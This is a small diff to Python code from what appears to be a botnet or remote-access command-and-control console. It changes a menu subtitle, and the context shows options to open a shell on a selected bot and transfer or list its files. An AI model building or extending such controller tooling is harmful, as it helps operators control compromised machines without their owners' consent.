@@ -184,7 +184,7 @@ def get_instructions():
     if opt == 0:
         if len(users) > 0:
             curr_users = [u.id for u in users]  # in case list of users changes before selection made
-            opt = get_choice([f'{user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='Name | IP:port | Status')
+            opt = get_choice([f'{user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='Name | IP | Status')
             if opt != len(curr_users):
                 user = get_user(curr_users[opt])
                 bot_opts = [Back.RED + 'Enter Shell' if not user.alive else 'Enter Shell', Back.RED + 'Upload File to Client' if not user.alive else 'Upload File to Client', Back.RED + 'Download File From Client' if not user.alive else 'Download File From Client', Back.RED + 'Get list of files on bot' if not user.alive else 'Get list of files on bot', Back.RED + 'View bot info' if not user.alive else 'View bot info', 'View bot session logs', 'Main Menu']
